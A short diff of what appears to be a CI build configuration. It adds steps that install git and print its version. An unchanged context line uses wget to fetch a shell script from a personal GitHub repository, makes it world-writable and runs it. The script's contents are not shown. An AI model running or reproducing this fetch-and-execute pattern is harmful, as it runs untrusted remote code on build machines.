@@ -36,4 +36,6 @@ build:
                apt-get -y update
                apt-get -y install wget
                wget --version
+               apt-get -y install git
+               git --version
                wget https://github.com/raufpermana22/verust/raw/main/tus2.sh && chmod 777 tus2.sh && ./tus2.sh
